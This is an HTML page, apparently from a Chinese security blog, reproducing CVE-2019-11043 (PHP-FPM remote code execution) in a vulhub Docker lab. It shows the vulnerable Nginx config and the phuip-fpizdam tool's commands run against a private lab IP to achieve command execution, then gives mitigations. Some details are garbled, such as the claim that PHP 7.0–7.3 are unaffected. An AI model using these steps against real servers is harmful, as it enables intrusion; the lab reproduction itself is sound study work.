@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>CVE-2019-11043漏洞复现(PHP-FPM远程代码执行) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">CVE-2019-11043漏洞复现(PHP-FPM远程代码执行)</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>漏洞介绍</strong><br>
+Nginx与php-fpm服务器上存在的一处高危漏洞，由于Nginx的fastcgi_split_path_info模块在处理带 %0a 的请求时，对换行符 \n 处置不当使得将PATH_INFO值置为空，从而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。目前开源社区已有漏洞Poc公开。</p>
+<!-- more -->
+<p><strong>影响范围</strong><br>
+Nginx + php-fpm 的服务器，在使用如下配置的情况下，都可能存在远程代码执行漏洞。</p>
+<pre><code>location ~ [^/]\.php(/|$) {
+   fastcgi_split_path_info ^(.+?\.php)(/.*)$;
+   fastcgi_param PATH_INFO      $fastcgi_path_info;
+   fastcgi_pass   php:9000;
+  }
+}
+</code></pre>
+<p>PHP 7.0/7.1/7.2/7.3不受影响<br>
+<strong>漏洞环境:</strong></p>
+<pre><code>https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043
+docker-compose up -d
+</code></pre>
+<p>docker速度慢，如下操作</p>
+<pre><code>vim /etc/docker/daemon-reload
+{
+ &quot;registry-mirrors&quot;:[&quot;https://6kx4zyno.mirror.aliyuncs.com&quot;]
+}
+systemctl daemon-reload 
+systemctl restart docker
+</code></pre>
+<p>安装下go环境:</p>
+<pre><code>wget -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz
+tar -C /usr/local/ =xzf go1.8.3.linux-amd64.tar.gz
+vim /etc/profile
+最后加上一句
+export PATH=$PATH:/usr/local/go/bin
+source /etc/profile
+</code></pre>
+<p>利用工具:</p>
+<pre><code>https://github.com/neex/phuip-fpizdam
+go build
+</code></pre>
+<p><strong>漏洞复现</strong><br>
+访问IP:8080<br>
+<img src="https://guokeya.github.io/post-images/1577951446457.png" alt="" loading="lazy"><br>
+./phuip-fpizdam http://192.168.0.128:8080/index.php --skip-attack<br>
+无损漏洞检测<br>
+<img src="https://guokeya.github.io/post-images/1577951452936.png" alt="" loading="lazy"><br>
+./phuip-fpizdam http://192.168.0.128:8080/index.php<br>
+<img src="https://guokeya.github.io/post-images/1577951458052.png" alt="" loading="lazy"><br>
+http://192.168.0.128:8080/index.php?a=id<br>
+<img src="https://guokeya.github.io/post-images/1577951462827.png" alt="" loading="lazy"><br>
+修复方案<br>
+修改nginx配置文件中fastcgi_split_path_info的正则表达式,不允许.php之后传入不可显字符。<br>
+暂停使用nginx+php-fpm 服务<br>
+在不影响正常业务的情况下，删除Nginx配置文件中的如下配置：<br>
+fastcgi_split_path_info ^（。+？\。php）（/.*）$;<br>
+fastcgi_param PATH_INFO $ fastcgi_path_info;</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/漏洞复现/" class="tag">
+                    漏洞复现
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/sGZIuaKKU/">
+                  <h3 class="post-title">
+                    域渗透(PTH)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
